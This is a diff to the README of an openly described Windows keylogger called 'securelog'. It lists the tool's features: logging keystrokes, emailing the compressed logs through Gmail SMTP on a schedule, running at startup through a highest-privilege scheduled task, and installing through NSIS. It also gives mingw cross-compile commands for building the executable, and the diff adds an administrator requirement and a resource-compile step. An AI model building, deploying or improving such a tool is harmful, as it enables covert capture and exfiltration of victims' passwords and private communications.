@@ -8,6 +8,7 @@ This is a lazy implementation for a keylogger that sends keylogs through gmail s
 
 * Logs keys and makes notes about special keys and stores them in a file.
 * Downloads Mozilla's certificates bundle made by the [curl team](http://curl.haxx.se/ca/cacert.pem) to use it for secure connexion to Gmail SMTP.
+* Requires administrator if not.
 * Upon a scheduled task sends keylog file as compressed attachement.
 * Autoruns on startup with a scheduled task with highest privileges.
 * Handy NSIS Installer (we will make our scheduled tasks from there).
@@ -92,10 +93,18 @@ make install
 
 #### The main program
 
+We have to compile our resource file:
+
+```bash
+i586-mingw32msvc-windres securelog.rc securelog.o
+```
+
+Then the main thing:
+
 ```bash
 i586-mingw32msvc-gcc -O3 -Os -s -Wno-system-headers -mwindows -DCURL_STATICLIB \
 -I$(pwd)/zlib/build/include -I$(pwd)/openssl/build/include \
--I$(pwd)/curl/build/include -o securelog.exe securelog.c -L$(pwd)/zlib/build/lib \
+-I$(pwd)/curl/build/include -o securelog.exe securelog.c securelog.o -L$(pwd)/zlib/build/lib \
 -L$(pwd)/openssl/build/lib -L$(pwd)/curl/build/lib $(pwd)/curl/build/lib/libcurl.a \
 $(pwd)/zlib/build/lib/libz.a $(pwd)/openssl/build/lib/libssl.a \
 $(pwd)/openssl/build/lib/libcrypto.a -lgdi32 -lssl -lcrypto -lcurl -lz -lws2_32
